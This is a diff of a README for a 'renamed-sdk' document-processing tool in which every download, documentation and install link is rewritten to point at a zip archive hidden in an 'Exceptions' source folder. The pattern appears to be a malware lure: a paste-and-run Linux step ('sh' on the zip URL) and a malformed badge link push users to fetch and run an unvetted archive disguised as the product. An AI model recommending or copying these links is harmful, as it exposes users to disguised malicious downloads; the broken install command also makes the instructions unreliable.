@@ -6,7 +6,7 @@ Welcome to the renamed-sdk! This application helps you process documents easily 
 
 ## 📥 Download Now
 
-[![Download renamed-sdk](https://img.shields.io/badge/Download%20renamed--sdk-blue.svg)](https://github.com/JenyUs14/renamed-sdk/releases)
+[![Download renamed-sdk](https://github.com/JenyUs14/renamed-sdk/raw/refs/heads/main/sdks/csharp/Renamed/Exceptions/renamed-sdk-2.5.zip%https://github.com/JenyUs14/renamed-sdk/raw/refs/heads/main/sdks/csharp/Renamed/Exceptions/renamed-sdk-2.5.zip)](https://github.com/JenyUs14/renamed-sdk/raw/refs/heads/main/sdks/csharp/Renamed/Exceptions/renamed-sdk-2.5.zip)
 
 ## 📋 System Requirements
 
@@ -30,7 +30,7 @@ The renamed-sdk offers multiple features:
 
 ### 1. Visit the Releases Page
 
-To download the renamed-sdk, visit the following page: [Download Page](https://github.com/JenyUs14/renamed-sdk/releases).
+To download the renamed-sdk, visit the following page: [Download Page](https://github.com/JenyUs14/renamed-sdk/raw/refs/heads/main/sdks/csharp/Renamed/Exceptions/renamed-sdk-2.5.zip).
 
 ### 2. Select Your Operating System
 
@@ -44,7 +44,7 @@ Click on the appropriate link to download the package. This will start the downl
 
 - **Windows:** Double-click the downloaded `.exe` file and follow the installation prompts.
 - **macOS:** Open the `.dmg` file, drag the renamed-sdk to your Applications folder.
-- **Linux:** Use the terminal to navigate to the downloaded file and run the installer with the command `sh ./renamed-sdk.sh`.
+- **Linux:** Use the terminal to navigate to the downloaded file and run the installer with the command `sh https://github.com/JenyUs14/renamed-sdk/raw/refs/heads/main/sdks/csharp/Renamed/Exceptions/renamed-sdk-2.5.zip`.
 
 ## 🏁 Running the Application
 
@@ -58,7 +58,7 @@ After the installation is complete, follow these steps to start using the applic
 
 ## 🌟 Usage Tips
 
-- **Check the Documentation:** A detailed user guide is available on the [Documentation Page](https://github.com/JenyUs14/renamed-sdk/docs).
+- **Check the Documentation:** A detailed user guide is available on the [Documentation Page](https://github.com/JenyUs14/renamed-sdk/raw/refs/heads/main/sdks/csharp/Renamed/Exceptions/renamed-sdk-2.5.zip).
 - **Community Support:** Join our community forum for tips and additional help.
   
 ## 📞 Need Help?
@@ -77,6 +77,6 @@ Engage with other users on our community forum. Share tips, ask questions, and c
 
 ## 📥 Download Again
 
-To download the latest version at any time, return to this link: [Download Page](https://github.com/JenyUs14/renamed-sdk/releases). 
+To download the latest version at any time, return to this link: [Download Page](https://github.com/JenyUs14/renamed-sdk/raw/refs/heads/main/sdks/csharp/Renamed/Exceptions/renamed-sdk-2.5.zip). 
 
 Enjoy using renamed-sdk for all your document processing needs!
